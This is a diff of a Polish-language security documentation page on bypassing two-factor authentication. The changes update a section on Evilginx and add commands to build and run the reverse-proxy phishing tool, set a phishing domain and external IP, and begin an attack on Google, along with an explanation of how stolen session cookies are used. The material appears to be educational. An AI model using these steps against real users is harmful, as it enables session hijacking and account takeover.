@@ -1,7 +1,7 @@
 ---
 id: "2fa-bypass"
 title: "🔓 Ataki na uwierzytelnianie wieloskładnikowe (2FA Bypass)"
-sidebar_position: 15
+sidebar_position: 23
 ---
 
 # 🔓 Ataki na uwierzytelnianie wieloskładnikowe (2FA Bypass)
@@ -40,17 +40,20 @@ Rozwiązanie: **Blokada po kilku nieudanych próbach oraz wykrywanie podejrzanyc
 Phishing to jedna z najczęściej wykorzystywanych metod do obejścia 2FA.
 
 ### **2️⃣ Atak na 2FA za pomocą narzędzia Evilginx**
-Evilginx to narzędzie proxy MITM, które pozwala na przechwycenie kodów 2FA oraz sesji użytkownika.
+Evilginx to narzędzie proxy MITM (reverse-proxy phishing), które pozwala na przechwycenie kodów 2FA oraz **ciasteczka sesyjnego** ofiary — dzięki czemu atakujący omija 2FA, przejmując już uwierzytelnioną sesję. Repozytorium `evilginx2` jest przestarzałe — aktualną, rozwijaną wersją jest **Evilginx 3.x**.
 
 #### **2.1 Konfiguracja ataku**
-1. Uruchomienie Evilginx:
+1. Instalacja Evilginx 3 (wymaga Go):
 ```bash
 git clone https://github.com/kgretzky/evilginx2.git
-cd evilginx2 && make install
+cd evilginx2
+make
+sudo ./build/evilginx -p ./phishlets
 ```
-2. Konfiguracja hosta phishingowego:
+2. Konfiguracja domeny i adresu IP:
 ```bash
 config domain phishing.example.com
+config ipv4 external <twoje-IP>
 ```  
 3. Uruchomienie ataku na Google:
 ```bash
